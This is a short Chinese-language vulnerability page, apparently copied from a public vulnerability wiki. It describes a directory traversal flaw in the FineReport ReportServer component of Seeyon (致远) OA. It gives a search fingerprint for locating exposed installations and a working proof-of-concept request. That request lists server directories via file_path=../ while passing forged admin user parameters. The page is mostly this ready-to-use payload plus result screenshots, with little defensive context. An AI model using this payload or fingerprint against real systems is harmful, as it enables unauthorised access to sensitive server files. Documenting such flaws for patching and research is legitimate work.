---
title: "致远OA 帆软组件 ReportServer 目录遍历漏洞"
date: 2026-10-17 09:13:23
categories:
  - WebSecurity
  - CVE
  - "OA"
  - "致远OA"
tags:
  - "致远OA"
  - "目录遍历"
  - "信息泄露"
  - "漏洞复现"
---
## 漏洞描述

致远OA 帆软组件 ReportServer接口存在目录遍历漏洞，攻击者通过漏洞可以获取服务器敏感信息

## 漏洞影响

```
致远OA 帆软组件
```

## 网络测绘

```
title="致远A8-V5协同管理软件 V6.1sp1"
```

## 漏洞复现

登录页面

![image-20220824142626725](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202208241426793.png)

验证POC

```
/seeyonreport/ReportServer?op=fs_remote_design&cmd=design_list_file&file_path=../&currentUserName=admin&currentUserId=1&isWebReport=true
```

![image-20220824142642510](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202208241426552.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/oa/%E8%87%B4%E8%BF%9COA-%E5%B8%86%E8%BD%AF%E7%BB%84%E4%BB%B6-ReportServer-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E.md)
